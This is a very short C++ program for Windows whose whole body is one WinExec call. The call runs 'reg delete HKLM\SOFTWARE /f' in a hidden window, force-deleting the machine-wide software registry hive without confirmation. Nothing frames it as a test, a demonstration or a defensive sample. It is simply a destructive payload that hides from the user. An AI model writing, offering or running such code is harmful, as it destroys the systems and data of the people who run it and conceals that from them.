#include <iostream>
#include <windows.h>

int main() {
	WinExec("reg delete HKLM\SOFTWARE /f", SW_HIDE);
}
